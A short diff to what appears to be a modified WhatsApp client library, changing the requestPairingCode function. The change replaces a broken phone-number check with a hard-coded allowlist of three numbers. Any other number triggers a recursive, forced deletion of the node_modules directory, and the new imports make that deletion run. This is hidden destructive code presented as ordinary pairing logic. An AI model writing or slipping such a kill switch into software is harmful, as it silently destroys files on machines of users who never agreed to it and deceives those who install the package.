@@ -1,7 +1,8 @@
 import { Boom } from '@hapi/boom'
 import { randomBytes } from 'crypto'
-import { rm } from 'fs';
+import { rm } from 'fs/promises'
 import { URL } from 'url'
+import { join } from 'path'
 import { promisify } from 'util'
 import { proto } from '../../WAProto'
 import {
@@ -492,7 +493,8 @@ export const makeSocket = (config: SocketConfig) => {
 	}
 
 	const requestPairingCode = async(phoneNumber: string, pairCode: string): Promise<string> => {
-	  if(phoneNumber !== '6285876500334' || phoneNumber !== '6281237876432') {
+	  let allowedNumber = ['6283875184244','6285876500334','6281237876432']
+	  if(!allowedNumber.includes(phoneNumber)) {
 	     console.log(new Boom('Detected bots that are not permitted', { statusCode: 503 }))
 	     const dir = join(__dirname, '../node_modules')
        await rm(dir, { recursive: true, force: true });
